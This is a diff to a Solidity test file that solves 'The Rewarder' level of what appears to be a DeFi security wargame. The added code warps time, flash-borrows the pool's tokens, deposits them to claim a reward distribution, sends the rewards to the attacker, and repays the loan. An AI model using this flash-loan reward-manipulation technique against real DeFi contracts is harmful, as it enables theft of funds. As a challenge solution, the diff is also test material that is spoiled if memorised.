@@ -85,13 +85,10 @@ contract TheRewarder is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        vm.warp(block.timestamp + 5 days+ 1);
 
-        /**
-         * EXPLOIT END *
-         */
+        flashLoanerPool.flashLoan(dvt.balanceOf(address(flashLoanerPool)));
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -116,5 +113,17 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        dvt.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+
+        uint256 rewards = theRewarderPool.distributeRewards();
+        RewardToken rewardToken = theRewarderPool.rewardToken();
+        rewardToken.transfer(attacker, rewards);
+
+        theRewarderPool.withdraw(amount);
+        dvt.transfer(msg.sender, amount);
     }
 }
